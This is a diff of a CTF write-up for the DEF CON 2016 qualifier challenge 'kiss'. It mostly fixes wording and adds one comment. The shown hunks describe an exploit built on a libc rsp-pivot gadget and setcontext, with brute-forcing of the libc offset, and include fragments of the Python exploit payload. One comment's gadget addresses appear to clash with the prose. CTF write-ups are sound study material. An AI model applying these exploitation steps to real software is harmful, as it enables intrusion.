@@ -4,7 +4,7 @@ title: defcon qual 2016 kiss writeup
 category: writeup
 ---
 
-this problem is simple assembly challenge.
+This problem is simple assembly challenge.
 
 
 ```c
@@ -76,7 +76,7 @@ I can receive heap pointer and binary base approximately, so it seems easy. but 
 so all registers set to 0 except rax, rbx, rcx, rdx.
 the critical problem is that WE CAN'T CALL ANY FUNCTIONS, also ret gadget can't work.
 
-the first thing what i done is find gadget which controls rsp. there was one in libc, during makecontext.
+the first thing what i done is find gadget which controls rsp. there was one in libc makecontext function.
 
 ```
 .text:00000000000498B0                 mov     rsp, rbx
@@ -89,7 +89,7 @@ the first thing what i done is find gadget which controls rsp. there was one in 
 
 in addition, we can control full registers by setcontext, so all i did was put context structure in heap and jump to 0x498B0.
 
-but how to find libc offset? In x86-64, difference between pie_base and libc_base is constant for one machine (I guess it happens when va_randomize_space < 2, but I'm not sure) . In my local machine, offset difference was 0x5ea000, so I brute-force the offset between 0x500000 and 0x600000. to sure it was right offset, i used EB FE (infinite loop) gadget. here is my exploit code.
+but how to find libc offset? In x86-64, difference between pie_base and libc_base is constant for one machine (I guess it happens when randomize_va_space < 2, but I'm not sure) . In my local machine, offset difference was 0x5ea000, so I brute-force the offset between 0x500000 and 0x600000. to sure it was right offset, i used EB FE (infinite loop) gadget. here is my exploit code.
 
 ```python
 import pwnbox
@@ -139,6 +139,7 @@ p.read_until('want?')
 contextPayload = '\x00' * 0x200
 
 #contextPayload = struct.pack('<QQ',m+24, libc_base + 0* 0x40FF5 + 1 * 0x498B0) + contextPayload[16:]
+# 0xCF974 : setcontext gadget, 0x498B0 : infinite loop gadget(to find offset)
 contextPayload = struct.pack('<QQ',m+24, libc_base + 1* 0xCF974 + 0 * 0x498B0) + contextPayload[16:]
 contextPayload = contextPayload[0:0xE0] + struct.pack('<Q',m) + contextPayload[0xE8:]
 
